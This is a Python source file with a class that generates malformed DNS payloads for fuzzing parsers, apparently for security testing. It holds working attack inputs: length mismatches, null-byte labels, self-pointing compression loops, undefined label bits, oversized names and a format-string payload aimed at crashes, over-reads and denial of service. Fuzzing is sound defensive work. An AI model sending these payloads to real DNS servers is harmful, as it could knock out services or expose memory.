import struct
import random

class DNSPayloadGenerator:
    """
    A factory class for generating malformed DNS payloads.
    Based on 'Protocol Fuzzing' and 'DNS Attack Vectors' research.
    Focuses on parsing logic errors: Length Mismatches, Null Bytes, and Pointer Arithmetic.
    """

    @staticmethod
    def get_length_mismatch_payload(declared_len=20, actual_str=b"test"):
        """
        Generates 'The Binary Lie': Declares a long length but sends short data.
        Target: Heap Over-read / Buffer Overflow.
        [cite_start]Source Ref: [cite: 186-189] (Length Mismatch)
        """
        # Pack the length as a single byte
        length_byte = struct.pack("B", declared_len)
        return length_byte + actual_str

    @staticmethod
    def get_null_injection_payload():
        """
        Injects a NULL byte in the middle of a label.
        Target: C-String handling functions (strlen vs explicit length).
        [cite_start]Source Ref: [cite: 192-193] (Null Bytes in labels)
        """
        # Declares length 4, but the string is 'te\x00t'
        # 'strlen' might stop at 'te', but parser reads 4 bytes.
        return b"\x04te\x00t"

    @staticmethod
    def get_compression_loop_payload(offset=0x0C):
        """
        Creates a Compression Pointer that points to itself or an invalid location.
        Target: Infinite Loop (DoS) or Out-of-bounds Read.
        [cite_start]Source Ref: [cite: 162-167] (Pointer Loops)
        """
        # 0xC0 means "Compression Pointer" (11xxxxxx)
        # offset 0x0C (12) is usually the start of the Question Section in a header.
        # This creates a pointer that points to the start of the name, creating a loop.
        pointer = 0xC000 | offset
        return struct.pack("!H", pointer)

    @staticmethod
    def get_gray_area_label():
        """
        Generates a label with length bits '01' (0x40-0xBF).
        Target: Undefined Behavior. Not a valid length (00) and not a pointer (11).
        [cite_start]Source Ref: [cite: 198-201] (Oversized/Undefined Labels)
        """
        # 0x41 is '01000001' in binary.
        # Server might crash trying to interpret this.
        return b"\x41" + b"A" * 10

    @staticmethod
    def get_integer_overflow_payload():
        """
        Generates a label with the maximum possible length (0x3F = 63).
        followed by another max length label.
        Target: Integer Overflow in total name length calculation (limit is 255).
        """
        return b"\x3f" + (b"A" * 63) + b"\x3f" + (b"B" * 63)

    @staticmethod
    def get_format_string_payload():
        """
        Tries to exploit unsafe logging functions.
        Target: Format String Vulnerability.
        """
        return b"\x08%s%p%x%n"

    @classmethod
    def get_all_payloads(cls):
        """
        Returns a list of ALL malicious payloads for the fuzzer to iterate through.
        """
        return [
            cls.get_length_mismatch_payload(),     # The classic crash
            cls.get_null_injection_payload(),      # The confusing string
            cls.get_compression_loop_payload(),    # The CPU killer
            cls.get_gray_area_label(),             # The undefined behavior
            cls.get_integer_overflow_payload(),    # The size limit breaker
            cls.get_format_string_payload()        # The logger breaker
        ]

    @classmethod
    def get_random_typo(cls):
        """
        Returns one random payload from the arsenal.
        """
        return random.choice(cls.get_all_payloads())